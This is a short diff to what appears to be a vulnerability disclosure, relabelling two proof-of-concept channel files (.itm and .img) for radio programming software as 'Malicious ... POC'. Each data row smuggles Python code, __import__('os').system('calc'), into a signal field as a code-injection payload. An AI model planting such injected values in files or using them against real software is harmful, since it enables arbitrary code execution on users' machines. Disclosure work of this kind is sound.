@@ -33,7 +33,7 @@ Below are two POCs.
 ### Malicious `.itm`
 
 ```
-// Conventional Data
+// Malicious .itm POC
 CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
 1,1,146.520000,146.520000,PoC,__import__('os').system('calc'),0
 ```
@@ -41,7 +41,7 @@ CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
 ### Malicious `.img`
 
 ```
-// Conventional Data
+// Malicious .img POC
 CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
 1,0,146520000,146520000,EVIL,__import__('os').system('calc.exe'),0
 
